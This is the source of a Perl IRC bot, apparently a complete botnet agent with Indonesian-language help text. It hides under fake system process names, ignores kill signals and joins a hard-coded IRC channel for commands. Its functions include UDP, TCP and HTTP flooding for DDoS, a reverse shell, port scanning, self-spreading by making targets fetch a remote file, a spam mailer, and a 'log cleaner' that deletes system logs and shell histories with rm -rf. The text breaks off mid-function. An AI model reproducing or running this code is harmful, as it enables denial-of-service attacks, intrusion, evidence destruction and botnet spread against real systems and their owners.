use IO::Socket::INET;
use HTTP::Request;
use LWP::UserAgent;

my @ps = ("/usr/sbin/httpd","/usr/local/apache/bin/httpd -DSSL","/sbin/syslogd","[Deco]","/sbin/klogd -c 1 -x -x","/usr/sbin/acpid","/usr/sbin/cron","[httpds]","/usr/sbin/httpd","[bash]"); 
$processo = $ps[rand scalar @ps]; 
my $linas_max='10';
my $sleep='3';
my @adms=("Deddi");
my @canais="#NetWork";
my @nickname = ("cRc|1",
 "cRc|2",
 "cRc|3",
 "cRc|4",
 "cRc|5",
 "cRc|6",
 "cRc|7",
 "cRc|8",
 "cRc|9",
 "cRc|10",
 "cRc|11",
 "cRc|12",
 "cRc|13",
 "cRc|14",
 "cRc|15",
 "cRc|16",
 "cRc|17",
 "cRc|18",
 "cRc|19",
 "cRc|20",
 "cRc|21",
 "cRc|22",
 "cRc|23",
 "cRc|24",
 "cRc|25",
 "cRc|26",
 "cRc|27",
 "cRc|28",
 "cRc|29",
 "cRc|30",
 "cRc|31",
 "cRc|32",
 "cRc|33",
 "cRc|34",
 "cRc|35",
 "cRc|36",
 "cRc|37",
 "cRc|38",
 "cRc|39",
 "cRc|40",
 "cRc|41",
 "cRc|42",
 "cRc|43",
 "cRc|44",
 "cRc|45",
 "cRc|46",
 "cRc|47",
 "cRc|48",
 "cRc|49",
 "cRc|50",
 "cRc|51",
 "cRc|52",
 "cRc|53",
 "cRc|54",
 "cRc|55",
 "cRc|56",
 "cRc|57",
 "cRc|58",
 "cRc|59",
 "cRc|60",
 "cRc|61",
 "cRc|62",
 "cRc|63",
 "cRc|64",
 "cRc|65",
 "cRc|66",
 "cRc|67",
 "cRc|68",
 "cRc|69",
 "cRc|70",
 "cRc|71",
 "cRc|72",
 "cRc|73",
 "cRc|74",
 "cRc|75",
 "cRc|76",
 "cRc|77",
 "cRc|78",
 "cRc|79",
 "cRc|80",
 "cRc|81",
 "cRc|82",
 "cRc|83",
 "cRc|84",
 "cRc|85",
 "cRc|86",
 "cRc|87",
 "cRc|88",
 "cRc|89",
 "cRc|90",
 "cRc|91",
 "cRc|92",
 "cRc|93",
 "cRc|94",
 "cRc|95",
 "cRc|96",
 "cRc|97",
 "cRc|98",
 "cRc|99",
 "cRc|100",
 "cRc|101",
 "cRc|102",
 "cRc|103",
 "cRc|104",
 "cRc|105",
 "cRc|106",
 "cRc|107",
 "cRc|108",
 "cRc|109",
 "cRc|110",
 "cRc|111",
 "cRc|112",
 "cRc|113",
 "cRc|114",
 "cRc|115",
 "cRc|116",
 "cRc|117",
 "cRc|118",
 "cRc|119",
 "cRc|120",
 "cRc|121",
 "cRc|122",
 "cRc|123",
 "cRc|124",
 "cRc|125",
 "cRc|126",
 "cRc|127",
 "cRc|128",
 "cRc|129",
 "cRc|130",
 "cRc|131",
 "cRc|132",
 "cRc|133",
 "cRc|134",
 "cRc|135",
 "cRc|136",
 "cRc|137",
 "cRc|138",
 "cRc|139",
 "cRc|140",
 "cRc|141",
 "cRc|142",
 "cRc|143",
 "cRc|144",
 "cRc|145",
 "cRc|146",
 "cRc|147",
 "cRc|148",
 "cRc|149",
 "cRc|150",
 "cRc|151",
 "cRc|152",
 "cRc|153",
 "cRc|154",
 "cRc|155",
 "cRc|156",
 "cRc|157",
 "cRc|158",
 "cRc|159",
 "cRc|160",
 "cRc|161",
 "cRc|162",
 "cRc|163",
 "cRc|164",
 "cRc|165",
 "cRc|166",
 "cRc|167",
 "cRc|168",
 "cRc|169",
 "cRc|170",
 "cRc|171",
 "cRc|172",
 "cRc|173",
 "cRc|174",
 "cRc|175",
 "cRc|176",
 "cRc|177",
 "cRc|178",
 "cRc|179",
 "cRc|180",
 "cRc|181",
 "cRc|182",
 "cRc|183",
 "cRc|184",
 "cRc|185",
 "cRc|186",
 "cRc|187",
 "cRc|188",
 "cRc|189",
 "cRc|190",
 "cRc|191",
 "cRc|192",
 "cRc|193",
 "cRc|194",
 "cRc|195",
 "cRc|196",
 "cRc|197",
 "cRc|198",
 "cRc|199",
 "cRc|200",
 "cRc|201",
 "cRc|202",
 "cRc|203",
 "cRc|204",
 "cRc|205",
 "cRc|206",
 "cRc|207",
 "cRc|208",
 "cRc|209",
 "cRc|210",
 "cRc|211",
 "cRc|212",
 "cRc|213",
 "cRc|214",
 "cRc|215",
 "cRc|216",
 "cRc|217",
 "cRc|218",
 "cRc|219",
 "cRc|220",
 "cRc|221",
 "cRc|222",
 "cRc|223",
 "cRc|224",
 "cRc|225",
 "cRc|226",
 "cRc|227",
 "cRc|228",
 "cRc|229",
 "cRc|230",
 "cRc|231",
 "cRc|232",
 "cRc|233",
 "cRc|234",
 "cRc|235",
 "cRc|236",
 "cRc|237",
 "cRc|238",
 "cRc|239",
 "cRc|240",
 "cRc|241",
 "cRc|242",
 "cRc|243",
 "cRc|244",
 "cRc|245",
 "cRc|246",
 "cRc|247",
 "cRc|248",
 "cRc|249",
 "cRc|250",
 "cRc|251",
 "cRc|252",
 "cRc|253",
 "cRc|254",
 "cRc|255",
 "cRc|256",
 "cRc|257",
 "cRc|258",
 "cRc|259",
 "cRc|260",
 "cRc|261",
 "cRc|262",
 "cRc|263",
 "cRc|264",
 "cRc|265",
 "cRc|266",
 "cRc|267",
 "cRc|268",
 "cRc|269",
 "cRc|270",
 "cRc|271",
 "cRc|272",
 "cRc|273",
 "cRc|274",
 "cRc|275",
 "cRc|276",
 "cRc|277",
 "cRc|278",
 "cRc|279",
 "cRc|280",
 "cRc|281",
 "cRc|282",
 "cRc|283",
 "cRc|284",
 "cRc|285",
 "cRc|286",
 "cRc|287",
 "cRc|288",
 "cRc|289",
 "cRc|290",
 "cRc|291",
 "cRc|292",
 "cRc|293",
 "cRc|294",
 "cRc|295",
 "cRc|296",
 "cRc|297",
 "cRc|298",
 "cRc|299",
 "cRc|300",
 "cRc|301",
 "cRc|302",
 "cRc|303",
 "cRc|304",
 "cRc|305",
 "cRc|306",
 "cRc|307",
 "cRc|308",
 "cRc|309",
 "cRc|310",
 "cRc|311",
 "cRc|312",
 "cRc|313",
 "cRc|314",
 "cRc|315",
 "cRc|316",
 "cRc|317",
 "cRc|318",
 "cRc|319",
 "cRc|320",
 "cRc|321",
 "cRc|322",
 "cRc|323",
 "cRc|324",
 "cRc|325",
 "cRc|326",
 "cRc|327",
 "cRc|328",
 "cRc|329",
 "cRc|330",);
my @rname = (indo);
my $nick = $nickname[rand scalar @nickname];
my $ircname = $nickname[rand scalar @nickname];
my $realname = $rname[rand scalar @rname];
$servidor='irc.neolink.org' unless $servidor;
my $porta='6667';

$SIG{'INT'} = 'IGNORE';
$SIG{'HUP'} = 'IGNORE';
$SIG{'TERM'} = 'IGNORE';
$SIG{'CHLD'} = 'IGNORE';
$SIG{'PS'} = 'IGNORE';
use IO::Socket;
use Socket;
use IO::Select;
chdir("/");

###########
# Connect #
###########
$servidor="$ARGV[0]" if $ARGV[0];
$0="$processo"."\0"x16;;
my $pid=fork;
exit if $pid;
die "Fork Problems: $!" unless defined($pid);

our %irc_servers;
our %DCC;
my $dcc_sel = new IO::Select->new();
$sel_cliente = IO::Select->new();
sub sendraw {
  if ($#_ == '1') {
    my $socket = $_[0];
    print $socket "$_[1]\n";
    } else {
    print $IRC_cur_socket "$_[0]\n";
  }
}

sub conectar {
  my $meunick = $_[0];
  my $servidor_con = $_[1];
  my $porta_con = $_[2];
  my $IRC_socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$servidor_con",
  PeerPort=>$porta_con) or return(1);
  if (defined($IRC_socket)) {
    $IRC_cur_socket = $IRC_socket;
    $IRC_socket->autoflush(1);
    $sel_cliente->add($IRC_socket);
    $irc_servers{$IRC_cur_socket}{'host'} = "$servidor_con";
    $irc_servers{$IRC_cur_socket}{'porta'} = "$porta_con";
    $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
    $irc_servers{$IRC_cur_socket}{'meuip'} = $IRC_socket->sockhost;
    nick("$meunick");
    sendraw("USER $ircname ".$IRC_socket->sockhost." $servidor_con :$realname");
    sleep 1;
  }
}

my $line_temp;
while( 1 ) {
  while (!(keys(%irc_servers))) { conectar("$nick", "$servidor", "$porta"); }
  delete($irc_servers{''}) if (defined($irc_servers{''}));
  my @ready = $sel_cliente->can_read(0);
  next unless(@ready);
  foreach $fh (@ready) {
    $IRC_cur_socket = $fh;
    $meunick = $irc_servers{$IRC_cur_socket}{'nick'};
    $nread = sysread($fh, $msg, 4096);
    if ($nread == 0) {
      $sel_cliente->remove($fh);
      $fh->close;
      delete($irc_servers{$fh});
    }
    @lines = split (/\n/, $msg);
    for(my $c=0; $c<= $#lines; $c++) {

      $line = $lines[$c];
      $line=$line_temp.$line if ($line_temp);
      $line_temp='';
      $line =~ s/\r$//;
      unless ($c == $#lines) {
        parse("$line");
        } else {
        if ($#lines == 0) {
          parse("$line");
          } elsif ($lines[$c] =~ /\r$/) {
          parse("$line");
          } elsif ($line =~ /^(\S+) NOTICE AUTH :\*\*\*/) {
          parse("$line"); 
          	   } else {
          	               $line_temp = $line;
        }
      }
    }
  }
}

sub parse {
  my $servarg = shift;
  if ($servarg =~ /^PING \:(.*)/) {
    sendraw("PONG :$1");
    } elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/) {
    my $pn=$1; my $hostmask= $3; my $onde = $4; my $args = $5;
    if ($args =~ /^\001VERSION\001$/) {
      	 notice("$pn", "\001VERSION mIRC v6.17 Mic22\001");
    }
    if (grep {$_ =~ /^\Q$pn\E$/i } @adms ) {
    if ($onde eq "$meunick"){
    shell("$pn", "$args");
  }
  
##################
# End of Connect #
##################
######################
#      PREFIX        #
######################
  
  if ($args =~ /^(\Q$meunick\E|\!so)\s+(.*)/ ) {
    my $natrix = $1;
    my $arg = $2;
    if ($arg =~ /^\!(.*)/) {
      ircase("$pn","$onde","$1") unless ($natrix eq "!so" and $arg =~ /^\!nick/);
      } elsif ($arg =~ /^\@(.*)/) {
      $ondep = $onde;
      $ondep = $pn if $onde eq $meunick;
      bfunc("$ondep","$1");
      } else {
      shell("$onde", "$arg");
    }
  }
}
}
######################
#   End of PREFIX    #
######################

elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i) {
if (lc($1) eq lc($meunick)) {
  $meunick=$4;
  $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
}
} elsif ($servarg =~ m/^\:(.+?)\s+433/i) {
nick("$meunick".int rand(99));
} elsif ($servarg =~ m/^\:(.+?)\s+001\s+(\S+)\s/i) {
$meunick = $2;
$irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
$irc_servers{$IRC_cur_socket}{'nome'} = "$1";
foreach my $canal (@canais) {
  sendraw("JOIN $canal ddosit");
}
}
}

sub bfunc {
my $printl = $_[0];
my $funcarg = $_[1];
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
  exit;
} else {

######################
#       Help         # 
######################

if ($funcarg =~ /^help/) {
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.Help12.:!:. Lets Go!, Nih depe command :");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.Help12.:!:. !so 12@ddos");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.Help12.:!:. !so 12@scanscan");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.Help12.:!:. !so 12@backconnect");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.Help12.:!:. !so 12@shell");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.Help12.:!:. !so 12@portscanner");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.Help12.:!:. Untuk command lain, ketik:");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.Help12.:!:. !so 7@commands");

}

if ($funcarg =~ /^ddos/) {
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.Help12.:!:. Ada tiga command DDOS");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.Help12.:!:. UDPFlood, HTTPFlood and TCPFlood");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.Help12.:!:. !so 12@udpflood <ip> <packet size> <time>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.Help12.:!:. !so 12@tcpflood <ip> <port> <packet size> <time>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.Help12.:!:. !so 12@httpflood <site> <time>");

}

if ($funcarg =~ /^backconnect/) {
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.Help12.:!:. Gunakan command ini untuk reverse shell :");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.Help12.:!:. !so 7@back <ip><port>");
}

if ($funcarg =~ /^shell/) {
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.Help12.:!:. Command integrasi bot shell");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.Help12.:!:. Bisa digunakan untuk privat maupun public channel");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.Help12.:!:. Untuk public chan gunakan : 12!so cd tmp12 (contoh)");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.Help12.:!:. Untuk command linux ketik :!so 7@linuxhelp");
}

if ($funcarg =~ /^portscanner/) {
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.Help12.:!:. Ini adalah command portscan dam Nmap:");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.Help12.:!:. !so 12@portscan <ip>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.Help12.:!:. !so 12@nmap <ip> <beginport> <endport>");
}

if ($funcarg =~ /^commands/) {
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4.:!:.Help4.:!:. Ini commandnya :");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.Help12.:!:. !so 12@portscan <ip>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.Help12.:!:. !so 12@nmap <ip> <beginport> <endport>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.Help12.:!:. !so 12@back <ip><port>");	
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.Help12.:!:. !so cd tmp 4 untuk contoh");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.Help12.:!:. !so 12@udpflood <ip> <packet size> <time>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.Help12.:!:. !so 12@tcpflood <ip> <port> <packet size> <time>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.Help12.:!:. !so 12@httpflood <site> <time>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.Help12.:!:. !so 12@linuxhelp");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.Help12.:!:. !so 12@spread <scan>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.Help12.:!:. !so 12@scan <vuln> <dork>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.Help12.:!:. !so 12@system");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.Help12.:!:. !so 12@logcleaner");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.Help12.:!:. !so 12@sendmail <subject> <sender> <recipient> <message>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.Help12.:!:. !so 12@milw0rm");	
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.Help12.:!:. !so 12@join #channel");	
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.Help12.:!:. !so 12@part #channel");
}

if ($funcarg =~ /^linuxhelp/) {
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.LinuxHelp12.:!:. - Dir where you are : pwd");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.LinuxHelp12.:!:. - Start a Perl file : perl file.pl");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.LinuxHelp12.:!:. - Go back from dir : cd ..");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.LinuxHelp12.:!:. - Force to Remove a file/dir : rm -rf file/dir;ls -la");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.LinuxHelp12.:!:. - Show all files/dir with permissions : ls -lia");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.LinuxHelp12.:!:. - Find config.inc.php files : find / -type f -name config.inc.php");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.LinuxHelp12.:!:. - Find all writable folders and files : find / -perm -2 -ls");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.LinuxHelp12.:!:. - Find all .htpasswd files : find / -type f -name .htpasswd");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.LinuxHelp12.:!:. - Find all service.pwd files : find / -type f -name service.pwd");
}

######################
#   End of  Help     # 
######################
if ($funcarg =~ /^spread\s+(.*)/) {
my $sbj = "http://goodfilter.net/maker/info/spd.txt?";
$vuln = $1;
sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.Spread Mode12.:!:. Spreading bot on :14 $vuln");
my $shellurl="http://".$vuln.$sbj."?";
my $reqz=HTTP::Request->new(GET=>$shellurl);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.Spread Mode12.:!:. Bot is Spreaded on :14 $vuln"); 
}

if ($funcarg =~ /^spreads\s+(.*)/) {
my $soh = "http://goodfilter.net/maker/info/spd.txt?";
$vuln = $1;
sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.Spread Mode12.:!:. Spreading bot on :14 $vuln");
my $shellurl="http://".$vuln.$soh."?";
my $reqz=HTTP::Request->new(GET=>$shellurl);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.Spread Mode12.:!:. Conficker Bot is Spreaded on :14 $vuln"); 
}
######################
#     Commands       # 
######################

if ($funcarg =~ /^system/) {
$uname=`uname -a`;$uptime=`uptime`;$ownd=`pwd`;$distro=`cat /etc/issue`;$id=`id`;$un=`uname -sro`;
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.System Info12.:!:. Info BOT : Server : 14Cannot View :14 1337");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.System Info12.:!:. Uname -a     : 7 $uname");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.System Info12.:!:. Uptime       : 7 $uptime");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.System Info12.:!:. Own Prosses  : 7 $processo");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.System Info12.:!:. ID           : 7 $id");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.System Info12.:!:. Own Dir      : 7 $ownd");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.System Info12.:!:. OS           : 7 $distro");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.System Info12.:!:. Owner        : 7 aputo");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.System Info12.:!:. Channel      : 7 ssab");
}

if ($funcarg =~ /^milw0rm/) {
	my @ltt=();
	my @bug=();
	my $x;
	my $page="";
	my $socke = IO::Socket::INET->new(PeerAddr=>"milw0rm.com",PeerPort=>"80",Proto=>"tcp") or return;
	print $socke "GET http://milw0rm.com/rss.php HTTP/1.0\r\nHost: milw0rm.com\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
	my @r = <$socke>;
	$page="@r";
	close($socke);
	while ($page =~  m/<title>(.*)</g){
	$x = $1;
	if ($x =~ /\&lt\;/) {
	$x =~ s/\&lt\;/</g;
	}
	if ($x !~ /milw0rm/) {
	push (@bug,$x);
	}}
	while ($page =~  m/<link.*expl.*([0-9]...)</g) {
	if ($1 !~ m/milw0rm.com|exploits|en/){
	push (@ltt,"http://www.milw0rm.com/exploits/$1 ");
	}}
		sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.Milw0rm Bugs12.:!:. gak bekerja, coba kembali :");
	foreach $x (0..(@ltt - 1)) {
		sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.Milw0rm Bugs12.:!:.14 $bug[$x] -3 $ltt[$x]");
	sleep 1;
}}
######################
#      Portscan      # 
######################

if ($funcarg =~ /^portscan (.*)/) {
  my $hostip="$1";
  my
  @portas=("15","19","98","20","21","22","23","25","37","39","42","43","49","53","63","69","79","80","101","106","107","109","110","111","113","115","117","119","135","137","139","143","174","194","389","389","427","443","444","445","464","488","512","513","514","520","540","546","548","565","609","631","636","694","749","750","767","774","783","808","902","988","993","994","995","1005","1025","1033","1066","1079","1080","1109","1433","1434","1512","2049","2105","2432","2583","3128","3306","4321","5000","5222","5223","5269","5555","6660","6661","6662","6663","6665","6666","6667","6668","6669","7000","7001","7741","8000","8018","8080","8200","10000","19150","27374","31310","33133","33733","55555");
  my (@aberta, %porta_banner);
  sendraw($IRC_cur_socket, "PRIVMSG $printl :(12.:!:.PortScan12.:!:.) 4Loading port scanner.. 12(wait a minute, ok !!)  12".$1." Starting now!! .");
  foreach my $porta (@portas)  {
    my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $porta, Proto =>
    'tcp', Timeout => 4);
    if ($scansock) {
      push (@aberta, $porta);
      $scansock->close;
    }
  }
  
  if (@aberta) {
    sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.PortScan12.:!:. 6open ports :5 @aberta");
    } else {
    sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.PortScan12.:!:. 6theres no open port");
  }
}

######################
#  End of  Portscan  # 
######################
######################
#        Nmap        #  
######################
   if ($funcarg =~ /^nmap\s+(.*)\s+(\d+)\s+(\d+)/){
         my $hostip="$1";
         my $portstart = "$2";
         my $portend = "$3";
         my (@abertas, %porta_banner); 
       sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.Nmap12.:!:. :4 $1 (7.:!:.Port7.:!:.) 12 $2-$3");
       foreach my $porta ($portstart..$portend){
               my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $porta, Proto => 'tcp', Timeout => $portime); 
    if ($scansock) {
                 push (@abertas, $porta);
                 $scansock->close;
                 if ($xstats){
        sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.Nmap12.:!:. Founded 4 $porta"."/Open"); 
                 }
               }
             }
             if (@abertas) {
        sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.Nmap12.:!:. Complete ");
             } else {
        sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.Nmap12.:!:. No open ports have been founded 13");
             }
			 }
######################
#    End of Nmap     #  
######################
######################
#    Log Cleaner     #  
######################
if ($funcarg =~ /^logcleaner/) {
sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.Log Cleaner!!!12.:!:. it takes a couple of minutes..."); 
    system 'rm -rf /var/log/lastlog';
    system 'rm -rf /var/log/wtmp';
	system 'rm -rf /etc/wtmp';
	system 'rm -rf /var/run/utmp';
	system 'rm -rf /etc/utmp';
	system 'rm -rf /var/log';
	system 'rm -rf /var/logs';
	system 'rm -rf /var/adm';
	system 'rm -rf /var/apache/log';
	system 'rm -rf /var/apache/logs';
	system 'rm -rf /usr/local/apache/log'; 
	system 'rm -rf /usr/local/apache/logs';
	system 'rm -rf /root/.bash_history';
	system 'rm -rf /root/.ksh_history';
sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.Log Cleaner12.:!:. 4log files have been cleaned"); 
		sleep 1;
sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.Log Cleaner12.:!:. 4system log cleaner");
	system 'find / -name *.bash_history -exec rm -rf {} \;';
	system 'find / -name *.bash_logout -exec rm -rf {} \;';
	system 'find / -name "log*" -exec rm -rf {} \;';
	system 'find / -name *.log -exec rm -rf {} \;';
		sleep 1;
sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.Log Cleaner12.:!:. 4done! all log files have been cleaned"); 
      }
######################
# End of Log Cleaner #  
######################
###########################################################
#       MAILER                                            #
# For mailing use :                                       #
# !lol @sendmail <subject> <sender> <recipient> <message> #
###########################################################
if ($funcarg =~ /^sendmail\s+(.*)\s+(.*)\s+(.*)\s+(.*)/) {
sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.Mailer12.:!:. Try Sending Mail to :10 $3");
$subject = $1;
$sender = $2;
$recipient = $3; 
@corpo = $4;
$mailtype = "content-type: text/html";
$sendmail = '/usr/sbin/sendmail';
open (SENDMAIL, "| $sendmail -t");
print SENDMAIL "$mailtype\n";
print SENDMAIL "Subject: $subject\n"; 
print SENDMAIL "From: $sender\n";
print SENDMAIL "To: $recipient\n\n";
print SENDMAIL "@corpo\n\n";
close (SENDMAIL);
sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.Mailer12.:!:. Successfully Sended to :10 $recipient"); 
}
######################
#   End of MAILER    #  
######################
######################
#  Join And Part     # 
######################
           if ($funcarg =~ /^join (.*)/) {
              sendraw($IRC_cur_socket, "JOIN ".$1);
           }
           if ($funcarg =~ /^part (.*)/) {
              sendraw($IRC_cur_socket, "PART ".$1);
           }
	   if($funcarg=~ /^\:$admin!.*\@.*PRIVMSG.*:!out/){
	      sendraw($IRC_cur_socket, "QUIT");
	   }
		   
######################
#End of Join And Part# 
######################
######################
#     TCPFlood       # 
######################

if ($funcarg =~ /^tcpflood\s+(.*)\s+(\d+)\s+(\d+)/) {
  sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.TCP DDoS12.:!:. Haaajjjaaarrr 4 ".$1.":".$2." for 12 ".$3." seconds.");
  my $itime = time;
  my ($cur_time);
  $cur_time = time - $itime;
  while ($3>$cur_time){
  $cur_time = time - $itime;
  &tcpflooder("$1","$2","$3");
}
sendraw($IRC_cur_socket,"PRIVMSG $printl :12.:!:.TCP DDoS12.:!:. Missi Selesai.. 12 ".$1.":".$2.".");
}
######################
#  End of TCPFlood   # 
######################
######################
#   Back Connect     # 
######################
if ($funcarg =~ /^back\s+(.*)\s+(\d+)/) {
my $host = "$1";
my $porta = "$2";
my $proto = getprotobyname('tcp');
my $iaddr = inet_aton($host);
my $paddr = sockaddr_in($porta, $iaddr);
my $shell = "/bin/sh -i";
if ($^O eq "MSWin32") {
  $shell = "cmd.exe";
}
socket(SOCKET, PF_INET, SOCK_STREAM, $proto) or die "socket: $!";
connect(SOCKET, $paddr) or die "connect: $!";
open(STDIN, ">&SOCKET");
open(STDOUT, ">&SOCKET");
open(STDERR, ">&SOCKET");
system("$shell");
close(STDIN);
close(STDOUT);
close(STDERR);
if ($estatisticas)
{
  sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.BackConnect12.:!:. Connecting to 4 $host:$porta");
}
}
######################
#End of  Back Connect#
######################
######################
#     HTTPFlood      # 
#                    #
######################
if ($funcarg =~ /^httpflood\s+(.*)\s+(\d+)/) {
sendraw($IRC_cur_socket, "PRIVMSG $printl :7.:!:.Http DDoS7.:!:. Haaajjjaaarrr 12 ".$1." on port 80 untuk 4 ".$2." Detik .");
my $itime = time;
my ($cur_time);
$cur_time = time - $itime;
while ($2>$cur_time){
$cur_time = time - $itime;
my $socket = IO::Socket::INET->new(proto=>'tcp', PeerAddr=>$1, PeerPort=>80);
print $socket "GET / HTTP/1.1\r\nAccept: */*\r\nHost: ".$1."\r\nConnection: Keep-Alive\r\n\r\n";
close($socket);
}
sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.Http DDoS12:!:. Selesai menghajar 4 ".$1.".");
}
######################
#  End of HTTPFlood  # 
#                    #
######################
######################
#     UDPFlood       # 
#                    #
######################
if ($funcarg =~ /^udpflood\s+(.*)\s+(\d+)\s+(\d+)/) {
sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.Udp DDoS12.:!:. Haaajjjaaarrr12 ".$1." dengan 4 ".$2." Kb Packets untuk 4 ".$3." detik.");
my ($dtime, %pacotes) = udpflooder("$1", "$2", "$3");
$dtime = 1 if $dtime == 0;
my %bytes;
$bytes{igmp} = $2 * $pacotes{igmp};
$bytes{icmp} = $2 * $pacotes{icmp};
$bytes{o} = $2 * $pacotes{o};
$bytes{udp} = $2 * $pacotes{udp};
$bytes{tcp} = $2 * $pacotes{tcp};
sendraw($IRC_cur_socket, "PRIVMSG $printl :12.:!:.Udp DDoS12.:!:. Results4 ".int(($bytes{icmp}+$bytes{igmp}+$bytes{udp} + $bytes{o})/1024)." Kb in12 ".$dtime." seconds to12 ".$1.".");
}
exit;
}
}
######################
#  End of Udpflood   # 
#                    #
######################


sub ircase {
my ($kem, $printl, $case) = @_;
  if ($case =~ /^join (.*)/) {
     j("$1");
   }
   if ($case =~ /^part (.*)/) {
      p("$1");
   }
if ($case =~ /^rejoin\s+(.*)/) {
my $chan = $1;
if ($chan =~ /^(\d+) (.*)/) {
for (my $ca = 1; $ca <= $1; $ca++ ) {
p("$2");
j("$2");
}
}
else {
p("$chan");
j("$chan");
}
}

if ($case =~ /^op/) {
op("$printl", "$kem") if $case eq "op";
my $oarg = substr($case, 3);
op("$1", "$2") if ($oarg =~ /(\S+)\s+(\S+)/);
}

if ($case =~ /^deop/) {
deop("$printl", "$kem") if $case eq "deop";
my $oarg = substr($case, 5);
deop("$1", "$2") if ($oarg =~ /(\S+)\s+(\S+)/);
}

if ($case =~ /^msg\s+(\S+) (.*)/) {
msg("$1", "$2");
}

